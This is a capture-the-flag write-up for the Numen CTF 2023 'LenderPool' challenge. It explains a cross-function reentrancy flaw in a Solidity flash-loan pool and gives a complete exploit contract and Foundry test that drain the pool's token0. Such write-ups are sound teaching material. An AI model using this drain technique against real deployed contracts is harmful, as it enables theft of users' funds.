# Numen CTF 2023 : LenderPool

### Contract code :
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

...

contract LenderPool is ReentrancyGuard {
    using Address for address;
    IERC20 public immutable token0;
    IERC20 public immutable token1;

    constructor() {
        token0 = new ERC20();
        token1 = new ERC20();
    }

    function swap(address tokenAddress,uint amount) public returns(uint){
        require(
            tokenAddress == address(token0)
        
            && token1.transferFrom(msg.sender,address(this),amount) 
            
            && token0.transfer(msg.sender,amount)

            || tokenAddress== address(token1)
            
            && token0.transferFrom(msg.sender,address(this),amount) 
            
            && token1.transfer(msg.sender,amount));
        return amount;

    } 

    function flashLoan(uint256 borrowAmount, address borrower)
        external
        nonReentrant
    {
        uint256 balanceBefore = token0.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token0.transfer(borrower, borrowAmount);
        borrower.functionCall(abi.encodeWithSignature("receiveEther(uint256)", borrowAmount));

        uint256 balanceAfter = token0.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

contract Check{
    LenderPool public lenderPool;
    IERC20 token0;
    constructor(){
        lenderPool = new LenderPool();
        token0 = lenderPool.token0();
    }

    function isSolved()  public view returns(bool){

        if(token0.balanceOf(address(lenderPool)) == 0){
           return  true;
        }
        return false;
    }
}
```

The goal is to drain token0 from the lenderpool

It has a flashloan function to lend out flashloan in token0, it will check the balance of token0 before and after the token transfer and external call, also it has the `nonReentrant` modifier

However the `swap()` function doesn't have the `nonReentrant` modifier, so it's vulnerable to cross-function reentrancy attack

As it just check the balance of token0, we can return the flashloan using `swap()` by swapping all token0 to token1, so the token0 balance of the lenderpool will be the same as the token0 balance before the flashloan is transfered

### Exploit contract :
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import "./Re.sol";

contract lenderpoolExploit {
    
    LenderPool public lenderpool;
    
    function exploit(address _lenderpool) public {
        lenderpool = LenderPool(_lenderpool);
        lenderpool.flashLoan(IERC20(lenderpool.token0()).balanceOf(_lenderpool), address(this));
        // swap all token1 to token0
        IERC20(address(lenderpool.token1())).approve(address(lenderpool), IERC20(lenderpool.token1()).balanceOf(address(this)));
        lenderpool.swap(address(lenderpool.token0()), IERC20(lenderpool.token1()).balanceOf(address(this)));
    }
    
    function receiveEther(uint256 borrowAmount) public {
        // return flashloan with swap() to get token1
        IERC20(address(lenderpool.token0())).approve(address(lenderpool), borrowAmount);
        lenderpool.swap(address(lenderpool.token1()), borrowAmount);
    }
}
```

### Foundry test :
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Re.sol";
import "../src/exploit.sol";

contract lenderpoolTest is Test {
    Check public check;
    LenderPool public lenderpool;
    lenderpoolExploit public exploit;
    address hacker = makeAddr("hacker");

    function setUp() public {
        check = new Check();
        lenderpool = check.lenderPool();
    }

    function testAttack() public {
        vm.startPrank(hacker);
        
        exploit = new lenderpoolExploit();
        exploit.exploit(address(lenderpool));
        
        assertTrue(check.isSolved());
    }
}
```